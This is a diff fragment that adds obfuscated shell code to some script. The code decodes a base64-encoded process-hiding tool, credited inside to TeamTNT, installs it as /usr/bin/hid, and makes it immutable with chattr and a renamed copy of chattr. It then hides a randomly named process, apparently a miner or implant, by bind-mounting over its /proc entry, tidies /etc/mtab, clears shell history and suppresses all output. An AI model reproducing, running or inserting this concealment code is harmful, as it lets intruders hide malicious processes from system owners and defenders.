@@ -1,0 +1,5 @@
+if [ ! -f /usr/bin/hid ]; then chattr -i /usr/bin/hid  2>/dev/null 1>/dev/null; tntrecht -i /usr/bin/hid  2>/dev/null 1>/dev/null; echo "IyEvYmluL2Jhc2gKIyAKIyBTbWFydCBIaWRlWW91clBJRCBWZXJzaW9uMgojIChjKSAyMDE5IGhpbGRlQHRlYW10bnQucmVkCiMKaWYgWyAteiAiJDEiIF07IHRoZW4gCmVjaG8gIm5vIFBJRCBzZXQhIjsgaGlzdG9yeSAtYyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgZXhpdCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAplbHNlCmlmIFsgISAtZSAvdXNyL2ZvbyBdOyB0aGVuIG1rZGlyIC91c3IvZm9vIC1wIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyBmaQpjcCAvZXRjL210YWIgL3Vzci90IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCm1vdW50IC0tYmluZCAvdXNyL2ZvbyAvcHJvYy8kMSAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAptdiAvdXNyL3QgL2V0Yy9tdGFiIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCmZpCmhpc3RvcnkgLWMgMj4vZGV2L251bGwgMT4vZGV2L251bGwKCg==" | base64 -d > /usr/bin/hid; chmod +x /usr/bin/hid 2>/dev/null 1>/dev/null; chattr +i /usr/bin/hid 2>/dev/null 1>/dev/null; tntrecht +i /usr/bin/hid  2>/dev/null 1>/dev/null; fi
+SCOPE_PID=`ps ax | grep -v grep | grep abyofigfefda6c3itn9f3zkrmjfays31 | awk '{print $1}'`
+echo $SCOPE_PID > /usr/bin/hid.sc.op.e
+hid $SCOPE_PID
+}
